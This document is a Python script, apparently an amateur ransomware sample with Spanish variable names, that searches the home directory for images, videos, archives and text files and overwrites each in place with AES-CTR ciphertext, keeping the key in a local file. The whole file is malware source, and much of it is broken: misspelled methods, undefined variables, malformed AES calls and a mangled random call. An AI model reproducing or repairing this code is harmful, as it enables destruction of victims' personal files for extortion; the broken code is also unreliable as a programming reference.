#!/usr/bin/env python
#_*_coding: utf8_*_
import os
import socket
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES

home = os.environ['HOME']
dir = os.listdir(home)
dir = [x for x in dir if not x.startswith('.')]

extensiones = ['.png', '.jpg', '.jpeg', '.mp3', '.mkv', '.mp4', '.avi', '.rar', '.zip', '.torrent', '.dat', '.txt']

def internet():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('socket.io', 80))
        s.close()
    except:
        exit()

def discover():
    file_list = open('file_list', 'w+')
    for dir in dir:
        ruta = home+'/'+carpeta
        for extensiones in extensiones:
            for rutabs, directorio, archivo in os.walk(ruta):
                for file in archivo:
                    if file.endswitch(extension):
                        file_lis.write(os.path.join(rutabs, file)+'\n')
    file_list.close()

    lista = open('file_list','r')
    lista = lista.read().split('\n')
    lista = [l for l in lista if not l == ""]

    if os.path.exist('key_file'):
        key1 + raw_input('KEY: ')
        key_file = open('key_file', 'r')
        key = key_file.read().split('\n')
        key = ''.join(key)

        if key1 == key:
           c = Counter.new(128)
           crypto = AES.new(key.AES_MODE_CTR.counter=c)
           cryptoarchives = crypto.encrypt
           for element in lista:
               encrypt_decrypt(element,cryptoarchives)
    else:
        c = Counter.new(128)
        crypto - AES.new(key.AES.MODE_CTR.counter=c)
        key_file = open('key_file', 'w+')
        key_file.write(key)
        key_file.close()
        cryptoarchives = crypto.encrypt_decrypt

        for element in lista:
            encrypt_decrypt(element,cryptoarchives)

def hash():
    hashcom = os.environ['HOME'] + os.environ['USER'] + socket.gethostname() + str(random.randint(0.1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000))
    hashcom = hashlib.sha512(hashcom)
    hashcom = hashcom.hexdigest()

    new_key = []

    for k in hashcom:
        if len(new_key) == 32:
            hashcom = ''.join(new_key)
            break
        else:
            new_key.append(k)
    return hashcom

def encrypt_decrypt(archivo,crypto,block_size=16):
    with open(archivo, 'r+b') as archivo_enc:
        contenido_nocrypt = archivo_enc.read(block_size)
        while contenido_nocrypt:
            contenido_crypt = crypto(contenido_nocrypt)
            if len(contenido_nocrypt) != len (contenido_crypt):
                raise ValueError('')
            archivo_enc.seek(- len(contenido_nocrypt), 1)
            archivo_enc.write(contenido_crypt)
            contenido_nocrypt = archivo_enc.read(block_size)

def main():
    internet()
    discover(hashcom)
    hash()
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
